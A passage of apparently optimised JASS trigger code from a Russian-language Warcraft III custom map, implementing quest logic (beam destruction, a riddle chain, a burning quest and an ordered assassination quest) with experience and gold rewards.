call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Все балки разрушены. Вернитесь за наградой.")
call EnableTrigger(cM)
call DestroyEffectBJ(Us[48])
call AddSpecialEffectTargetUnitBJ("overhead",J4,"war3mapImported\\QuestYellow1.mdx")
set Us[48]=GetLastCreatedEffectBJ()
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304F4A))
else
endif
else
endif
if BYo() then
call RemoveRect(FV)
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Балка разрушена.")
call DestroyEffect(GetLastCreatedEffectBJ())
call KillUnit(J2)
set TW[5]=TW[5]+1
if BYn() then
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Все балки разрушены. Вернитесь за наградой.")
call EnableTrigger(cM)
call DestroyEffectBJ(Us[48])
call AddSpecialEffectTargetUnitBJ("overhead",J4,"war3mapImported\\QuestYellow1.mdx")
set Us[48]=GetLastCreatedEffectBJ()
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304F4A))
else
endif
else
endif
if BYq() then
call RemoveRect(E6)
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Балка разрушена.")
call DestroyEffect(GetLastCreatedEffectBJ())
call KillUnit(J3)
set TW[5]=TW[5]+1
if BYp() then
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Все балки разрушены. Вернитесь за наградой.")
call EnableTrigger(cM)
call DestroyEffectBJ(Us[48])
call AddSpecialEffectTargetUnitBJ("overhead",J4,"war3mapImported\\QuestYellow1.mdx")
set Us[48]=GetLastCreatedEffectBJ()
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304F4A))
else
endif
else
endif
endfunction
function BYs takes nothing returns nothing
set cL=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(cL,EVENT_PLAYER_UNIT_USE_ITEM)
call TriggerAddCondition(cL,Condition(function BYg))
call TriggerAddAction(cL,function BYr)
endfunction
function BYt takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$75303031) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function BYu takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BYv takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BYw takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BYx takes nothing returns boolean
return GetBooleanAnd(BYv(),BYw())
endfunction
function BYy takes nothing returns boolean
return GetBooleanAnd(BYu(),BYx())
endfunction
function BYz takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=25) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=28) then
return false
endif
return true
endfunction
function BY0 takes nothing returns nothing
if BYz() then
call AddHeroXP(GetEnumUnit(),4000,false)
else
endif
endfunction
function BY1 takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=25) then
return false
endif
return true
endfunction
function BY2 takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=25) then
return false
endif
return true
endfunction
function BY3 takes nothing returns nothing
if BY2() then
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[48])
call UnitAddAbilityBJ($416E6532,GetOrderTargetUnit())
call UnitAddAbilityBJ($41706974,GetOrderTargetUnit())
call QuestSetCompletedBJ(YX[48],true)
call DestroyQuest(YX[48])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Хранитель:|r спасибо, Смертные. Не желаете взгянуть на мои товары?")
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BYy))
call ForGroupBJ(Th,function BY0)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF4000 опыта|r, |c00ffff00300 золота|r, |c00ff969620 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BY1() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+900
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+60
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff000025|r уровня",.027,255,255,255)
endif
endfunction
function BY4 takes nothing returns nothing
set cM=CreateTrigger()
call DisableTrigger(cM)
call TriggerRegisterAnyUnitEventBJ(cM,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(cM,Condition(function BYt))
call TriggerAddAction(cM,function BY3)
endfunction
function BY5 takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E303738) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function BY6 takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=51) then
return false
endif
return true
endfunction
function BY7 takes nothing returns nothing
if BY6() then
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[49])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|c00ff9696Одна из моих самых изощрённых загадок в этой карте. Итак, приготовьтесь, повторяю всего один раз.

Ответ на квест перед глазами,
Смотрите лучше пред собой.
Невинного убейте сами
Где начинали путь вы свой.")
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call EnableTrigger(cO)
else
call ne(GetTriggerUnit(),"Задание с |c00ff000051|r уровня",.027,255,255,255)
endif
endfunction
function BY8 takes nothing returns nothing
set cN=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(cN,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(cN,Condition(function BY5))
call TriggerAddAction(cN,function BY7)
endfunction
function BY9 takes nothing returns nothing
call DisplayTextToForce(GetPlayersAll(),"|c0000ffffВторую цель найти попроще,
Не так уж спрятана она.
Осады сдерживала мощно,
Сейчас же больше не нужна.")
call EnableTrigger(cP)
endfunction
function BZB takes nothing returns nothing
set cO=CreateTrigger()
call DisableTrigger(cO)
call TriggerRegisterUnitEvent(cO,Hw,EVENT_UNIT_DEATH)
call TriggerAddAction(cO,function BY9)
endfunction
function BZC takes nothing returns nothing
call DisplayTextToForce(GetPlayersAll(),"|c0000ffffЕщё чуть-чуть, осталось мало.
Ищите в заросли густой.
Перед поляной водопадов
Найдёте вы последний бой.
")
call EnableTrigger(cQ)
endfunction
function BZD takes nothing returns nothing
set cP=CreateTrigger()
call DisableTrigger(cP)
call TriggerRegisterUnitEvent(cP,H0,EVENT_UNIT_DEATH)
call TriggerAddAction(cP,function BZC)
endfunction
function BZE takes nothing returns nothing
call DisplayTextToForce(GetPlayersAll(),"|c0000ffffМожете себя поздравить. Вам открыт доступ к Новогоднему корпоративу.|r (вход с 51 уровня)")
call AddSpecialEffectLocBJ(GetRectCenter(FS),"Abilities\\Spells\\Human\\MassTeleport\\MassTeleportTo.mdl")
call EnableTrigger(cR)
endfunction
function BZF takes nothing returns nothing
set cQ=CreateTrigger()
call DisableTrigger(cQ)
call TriggerRegisterUnitEvent(cQ,J7,EVENT_UNIT_DEATH)
call TriggerAddAction(cQ,function BZE)
endfunction
function BZG takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
if not (GetUnitLevel(GetTriggerUnit())>=51) then
return false
endif
return true
endfunction
function BZH takes nothing returns nothing
call SetUnitPositionLoc(GetTriggerUnit(),GetRectCenter(FP))
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),GetRectCenter(FP),0)
endfunction
function BZI takes nothing returns nothing
set cR=CreateTrigger()
call DisableTrigger(cR)
call TriggerRegisterEnterRectSimple(cR,FS)
call TriggerAddCondition(cR,Condition(function BZG))
call TriggerAddAction(cR,function BZH)
endfunction
function BZJ takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BZK takes nothing returns boolean
if not (Te>=4) then
return false
endif
return true
endfunction
function BZL takes nothing returns nothing
set Te=Te+1
call DisplayTextToForce(GetPlayersAll(),"|c0000ffffРун активировано:|r "+(I2S(Te)+"/4"))
if BZK() then
call DisableTrigger(GetTriggeringTrigger())
call DisableTrigger(cT)
call EnableTrigger(cU)
call DisplayTextToForce(GetPlayersAll(),"|c0000ffffПроход открыт! Удачи")
call AddSpecialEffectLocBJ(GetRectCenter(FP),"Abilities\\Spells\\Human\\MassTeleport\\MassTeleportTo.mdl")
else
endif
endfunction
function BZM takes nothing returns nothing
set cS=CreateTrigger()
call TriggerRegisterEnterRectSimple(cS,FM)
call TriggerRegisterEnterRectSimple(cS,FN)
call TriggerRegisterEnterRectSimple(cS,Gg)
call TriggerRegisterEnterRectSimple(cS,FO)
call TriggerAddCondition(cS,Condition(function BZJ))
call TriggerAddAction(cS,function BZL)
endfunction
function BZN takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BZO takes nothing returns nothing
set Te=Te-1
call DisplayTextToForce(GetPlayersAll(),"|c0000ffffРун активировано:|r "+(I2S(Te)+"/4"))
endfunction
function BZP takes nothing returns nothing
set cT=CreateTrigger()
call TriggerRegisterLeaveRectSimple(cT,FM)
call TriggerRegisterLeaveRectSimple(cT,FN)
call TriggerRegisterLeaveRectSimple(cT,Gg)
call TriggerRegisterLeaveRectSimple(cT,FO)
call TriggerAddCondition(cT,Condition(function BZN))
call TriggerAddAction(cT,function BZO)
endfunction
function BZQ takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BZR takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$6E303654
endfunction
function BZS takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BZT takes nothing returns boolean
return GetBooleanAnd(BZR(),BZS())
endfunction
function BZU takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function BZV takes nothing returns nothing
local integer L9=0
set Td[0]=90
set Td[1]=75
set Td[2]=80
set V0=Location(11050.,6650.)
call SetUnitPositionLoc(GetTriggerUnit(),V0)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),V0,0)
call RemoveLocation(V0)
call SetUnitLifePercentBJ(K0,100)
call SetUnitOwner(K0,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(K0,true)
set SR=GetUnitsInRectMatching(FL,Condition(function BZT))
call ForGroupBJ(SR,function BZU)
call DestroyGroup(SR)
set Xq[999]=0
call SaveInteger(NY,GetHandleId(K0),1,0)
loop
call SaveInteger(NY,GetHandleId(K0),2+L9,0)
set L9=L9+1
exitwhen L9==7
endloop
endfunction
function BZW takes nothing returns nothing
set cU=CreateTrigger()
call DisableTrigger(cU)
call TriggerRegisterEnterRectSimple(cU,FP)
call TriggerAddCondition(cU,Condition(function BZQ))
call TriggerAddAction(cU,function BZV)
endfunction
function BZX takes nothing returns boolean
return GetRandomInt(1,3)==1
endfunction
function BZY takes nothing returns boolean
return GetRandomInt(1,3)==1
endfunction
function BZZ takes nothing returns boolean
return GetRandomInt(1,3)==1
endfunction
function BZa takes nothing returns nothing
call DisableTrigger(cU)
call DisableTrigger(cR)
if BZX() then
call CreateItemLoc($49305051,GetUnitLoc(GetTriggerUnit()))
else
call DoNothing()
endif
if BZY() then
call CreateItemLoc($49305052,GetUnitLoc(GetTriggerUnit()))
else
call DoNothing()
endif
if BZZ() then
call CreateItemLoc($4930504F,GetUnitLoc(GetTriggerUnit()))
else
call DoNothing()
endif
endfunction
function BZb takes nothing returns nothing
set cV=CreateTrigger()
call TriggerRegisterUnitEvent(cV,K0,EVENT_UNIT_DEATH)
call TriggerAddAction(cV,function BZa)
endfunction
function BZc takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$65737076) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function BZd takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=30) then
return false
endif
return true
endfunction
function BZe takes nothing returns nothing
if BZd() then
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(cX)
call DestroyEffectBJ(Us[50])
call AddSpecialEffectTargetUnitBJ("overhead",Is,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[50]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Пускай горит!\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 30-40|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Пускай горит","|c006969FFУровень задания: 30-40|r

|c00ffff00Дух Возмездия:|r видите эту кучу дров? Попробуйте поджечь пожалуйста землю под ними, дабы они сгорели к чертям!!! Мне неуютно в этом краю, где везде влага и куча воды.","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[50]=GetLastCreatedQuestBJ()
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
else
call ne(GetTriggerUnit(),"Задание с |c00ff000030|r уровня",.027,255,255,255)
endif
endfunction
function BZf takes nothing returns nothing
set cW=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(cW,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(cW,Condition(function BZc))
call TriggerAddAction(cW,function BZe)
endfunction
function BZg takes nothing returns boolean
if not (GetSpellAbilityId()==$41313342) then
return false
endif
if not (RectContainsUnit(Fh,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BZh takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(cY)
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$656E6773))
call DestroyEffectBJ(Us[50])
call AddSpecialEffectTargetUnitBJ("overhead",Is,"war3mapImported\\QuestYellow1.mdx")
set Us[50]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|c0000ff00Отлично. Но в процессе Ваш предмет был разрушен. Жаль..")
endfunction
function BZi takes nothing returns nothing
set cX=CreateTrigger()
call DisableTrigger(cX)
call TriggerRegisterAnyUnitEventBJ(cX,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(cX,Condition(function BZg))
call TriggerAddAction(cX,function BZh)
endfunction
function BZj takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$65737076) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function BZk takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BZl takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BZm takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BZn takes nothing returns boolean
return GetBooleanAnd(BZl(),BZm())
endfunction
function BZo takes nothing returns boolean
return GetBooleanAnd(BZk(),BZn())
endfunction
function BZp takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=30) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=40) then
return false
endif
return true
endfunction
function BZq takes nothing returns nothing
if BZp() then
call AddHeroXP(GetEnumUnit(),5000,false)
else
endif
endfunction
function BZr takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=30) then
return false
endif
return true
endfunction
function BZs takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=30) then
return false
endif
return true
endfunction
function BZt takes nothing returns nothing
if BZs() then
call DisableTrigger(GetTriggeringTrigger())
call CreateItemLoc($73687764,GetUnitLoc(GetTriggerUnit()))
call DestroyEffectBJ(Us[50])
call QuestSetCompletedBJ(YX[50],true)
call DestroyQuest(YX[50])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF5000 опыта|r, |c00ffff00400 золота|r, |c00ff969620 Кровавых Меток")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FFFF00Дух Возмездия:|r примите в дар этот камень. ")
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BZo))
call ForGroupBJ(Th,function BZq)
call DestroyGroup(Th)
set Sf=Sf+1
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BZr() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+1200
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+60
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff000030|r уровня",.027,255,255,255)
endif
endfunction
function BZu takes nothing returns nothing
set cY=CreateTrigger()
call DisableTrigger(cY)
call TriggerRegisterAnyUnitEventBJ(cY,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(cY,Condition(function BZj))
call TriggerAddAction(cY,function BZt)
endfunction
function BZv takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$45776172) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function BZw takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=35) then
return false
endif
return true
endfunction
function BZx takes nothing returns nothing
if BZw() then
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(ca)
call CreateItemLoc($4930524D,GetUnitLoc(GetTriggerUnit()))
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call DestroyEffectBJ(Us[51])
call AddSpecialEffectTargetUnitBJ("overhead",It,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[51]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Черный Список\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 35-50|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Черный Список","|c006969FFУровень задания: 35-50|r

|c00ffff00Смотрящая в Ночь:|r поступил тут заказ на устранение неких жертв из Черного Списка. Помогите убить всех пятерых целей и получите награду! Возьмите этот меч и неожиданно вонзите его в горло всем кого я назову. Но важно убивать их в определенном порядке. Собьете порядок - задание провалено.Итак, первый в нашем списке - летающий гибрид. Выпустите ему кишки наружу!","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[51]=GetLastCreatedQuestBJ()
else
call ne(GetTriggerUnit(),"Задание с |c00ff000035|r уровня",.027,255,255,255)
endif
endfunction
function BZy takes nothing returns nothing
set cZ=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(cZ,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(cZ,Condition(function BZv))
call TriggerAddAction(cZ,function BZx)
endfunction
function BZz takes nothing returns boolean
if not (GetSpellAbilityId()==$41313344) then
return false
endif
return true
endfunction
function BZ0 takes nothing returns boolean
if not (GetSpellTargetUnit()==IW) then
return false
endif
return true
endfunction
function BZ1 takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
if BZ0() then
call KillUnit(GetSpellTargetUnit())
call QuestSetDescription(YX[51],"Убейте 5 жертв из Списка. Вторая цель - Слишком огромный кусок дерева.
|c006969FFУровень задания:|r 35-50")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00ffff00Смотрящая в Ночь:|r Отлично! Первый из Списка мертв! Давайте дальше. Вторая цель: Слишком огромный кусок дерева.")
call TriggerSleepAction(2)
call EnableTrigger(cb)
else
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00ffff00Смотрящая в Ночь:|r Вы убили не того.... мне очень жаль. |c00ff0000Задание провалено!")
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$4930524D))
endif
endfunction
function BZ2 takes nothing returns nothing
set ca=CreateTrigger()
call DisableTrigger(ca)
call TriggerRegisterAnyUnitEventBJ(ca,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(ca,Condition(function BZz))
call TriggerAddAction(ca,function BZ1)
endfunction
function BZ3 takes nothing returns boolean
if not (GetSpellAbilityId()==$41313344) then
return false
endif
return true
endfunction
function BZ4 takes nothing returns boolean
if not (GetSpellTargetUnit()==Il) then
return false
endif
return true
endfunction
function BZ5 takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
if BZ4() then
call KillUnit(GetSpellTargetUnit())
call QuestSetDescription(YX[51],"Убейте 5 жертв из Списка. Третья цель - древня тень меня самой.
|c006969FFУровень задания:|r 35-50")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00ffff00Смотрящая в Ночь:|r Отлично! Второй из Списка мертв! Давайте дальше. Третья цель: древня тень меня самой.")
call TriggerSleepAction(2)
call EnableTrigger(cc)
else
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00ffff00Смотрящая в Ночь:|r Вы убили не того.... мне очень жаль. |c00ff0000Задание провалено!")
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$4930524D))
endif
endfunction
function BZ6 takes nothing returns nothing
set cb=CreateTrigger()
call DisableTrigger(cb)
call TriggerRegisterAnyUnitEventBJ(cb,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(cb,Condition(function BZ3))
call TriggerAddAction(cb,function BZ5)
endfunction
function BZ7 takes nothing returns boolean
if not (GetSpellAbilityId()==$41313344) then
return false
endif
return true
endfunction
function BZ8 takes nothing returns boolean
if not (GetSpellTargetUnit()==Is) then
return false
endif
return true
endfunction
function BZ9 takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
if BZ8() then
call KillUnit(GetSpellTargetUnit())
call QuestSetDescription(YX[51],"Убейте 5 жертв из Списка. Четвертая цель - старый орк, друг всех подводных тварей.
|c006969FFУровень задания:|r 35-50")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00ffff00Смотрящая в Ночь:|r Отлично! Третий из Списка мертв! Давайте дальше. Четвертая цель: старый орк, друг всех подводных тварей.")
call TriggerSleepAction(2)
call EnableTrigger(cd)
else
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00ffff00Смотрящая в Ночь:|r Вы убили не того.... мне очень жаль. |c00ff0000Задание провалено!")
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$4930524D))
endif
endfunction
function BaB takes nothing returns nothing
set cc=CreateTrigger()
call DisableTrigger(cc)
call TriggerRegisterAnyUnitEventBJ(cc,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(cc,Condition(function BZ7))
call TriggerAddAction(cc,function BZ9)
endfunction
function BaC takes nothing returns boolean
if not (GetSpellAbilityId()==$41313344) then
return false
endif
return true
endfunction
function BaD takes nothing returns boolean
if not (GetSpellTargetUnit()==I7) then
return false
endif
return true
endfunction
function BaE takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
if BaD() then
call KillUnit(GetSpellTargetUnit())
call QuestSetDescription(YX[51],"Убейте 5 жертв из Списка. Пятая цель - один из изготовителей важных деталей
|c006969FFУровень задания:|r 35-50")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00ffff00Смотрящая в Ночь:|r Отлично! Четвертый из Списка мертв! Давайте дальше. Пятая цель: один из изготовителей важных деталей")
call TriggerSleepAction(2)
call EnableTrigger(ce)
else
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00ffff00Смотрящая в Ночь:|r Вы убили не того.... мне очень жаль. |c00ff0000Задание провалено!")
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$4930524D))
endif
endfunction
function BaF takes nothing returns nothing
set cd=CreateTrigger()
call DisableTrigger(cd)
call TriggerRegisterAnyUnitEventBJ(cd,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(cd,Condition(function BaC))
call TriggerAddAction(cd,function BaE)
endfunction
function BaG takes nothing returns boolean
if not (GetSpellAbilityId()==$41313344) then
return false
endif
return true
endfunction
function BaH takes nothing returns boolean
if not (GetSpellTargetUnit()==Kt) then
return false
endif
return true
endfunction
function BaI takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
if BaH() then
call EnableTrigger(cf)
call KillUnit(GetSpellTargetUnit())
call QuestSetDescription(YX[51],"Все цели из Черного Списка убиты.
|c006969FFУровень задания:|r 35-50")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00ffff00Смотрящая в Ночь:|r Отлично! Все цели устранены. Вернитесь за наградой.")
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$4930524D))
call DestroyEffectBJ(Us[51])
call AddSpecialEffectTargetUnitBJ("overhead",It,"war3mapImported\\QuestYellow1.mdx")
set Us[51]=GetLastCreatedEffectBJ()
else
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00ffff00Смотрящая в Ночь:|r Вы убили не того.... мне очень жаль. |c00ff0000Задание провалено!")
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$4930524D))
endif
endfunction
function BaJ takes nothing returns nothing
set ce=CreateTrigger()
call DisableTrigger(ce)
call TriggerRegisterAnyUnitEventBJ(ce,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(ce,Condition(function BaG))
call TriggerAddAction(ce,function BaI)
endfunction
function BaK takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$45776172) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function BaL takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BaM takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BaN takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BaO takes nothing returns boolean
return GetBooleanAnd(BaM(),BaN())
endfunction
function BaP takes nothing returns boolean
return GetBooleanAnd(BaL(),BaO())
endfunction
function BaQ takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=35) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=50) then
return false
endif
return true
endfunction
function BaR takes nothing returns nothing
if BaQ() then
call AddHeroXP(GetEnumUnit(),5000,false)
else
endif
endfunction
function BaS takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=35) then
return false
endif
return true
endfunction
function BaT takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=35) then
return false
endif
return true
endfunction
function BaU takes nothing returns nothing
if BaT() then
call DisableTrigger(GetTriggeringTrigger())
call CreateItemLoc($4930524E,GetUnitLoc(GetTriggerUnit()))
call DestroyEffectBJ(Us[51])
call QuestSetCompletedBJ(YX[51],true)
call DestroyQuest(YX[51])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF5000 опыта|r, |c00ffff00400 золота|r, |c00ff969620 Кровавых Меток")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FFFF00Смотрящая в Ночь:|r примите в дар этот камень. ")
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BaP))
call ForGroupBJ(Th,function BaR)
call DestroyGroup(Th)
set Sf=Sf+1
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BaS() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+1200
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+60
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff000035|r уровня",.027,255,255,255)
endif
endfunction
function BaV takes nothing returns nothing
set cf=CreateTrigger()
call DisableTrigger(cf)
call TriggerRegisterAnyUnitEventBJ(cf,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(cf,Condition(function BaK))
call TriggerAddAction(cf,function BaU)
endfunction
function BaW takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49303930)==true) then
return false
endif
return true
